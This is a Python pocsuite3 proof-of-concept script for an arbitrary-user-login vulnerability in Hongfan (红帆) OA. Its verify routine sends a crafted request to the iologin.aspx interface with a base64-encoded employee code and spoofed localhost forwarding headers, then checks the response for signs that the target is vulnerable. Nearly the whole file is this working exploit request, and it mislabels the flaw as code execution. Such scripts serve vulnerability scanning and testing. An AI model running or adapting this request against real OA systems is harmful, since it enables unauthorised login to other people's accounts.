from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import random,time,base64,re

class TestPOC(POCBase):
    vulID = '1235'  # ssvid
    version = '1.0'
    name = '红帆OA 任意用户登录漏洞'
    appName = '红帆OA 任意用户登录漏洞'
    appVersion = '红帆'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''任意用户登录漏洞'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):              #验证模式
        result = {}
        path = "/iOffice/prg/interface/iologin.aspx?iempcode=SENHRkU=&reurl=1"
        vulurl = self.url+path
        headers={"X-Forwarded-For": "127.0.0.1",
                 "X-Originating" : "127.0.0.1",
                 "X-Remote-IP": "127.0.0.1",
                 "X-Remote-Addr": "127.0.0.1",
                 "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
                 }
        try:
            resp = requests.get(url=vulurl, verify = False, allow_redirects = False, timeout=5,headers=headers)
            if 'HCGFE' in resp.text and resp.status_code == 200 and "找不到对应的人员" in resp.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vulurl
            return self.parse_output(result)
        except:
            pass
    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
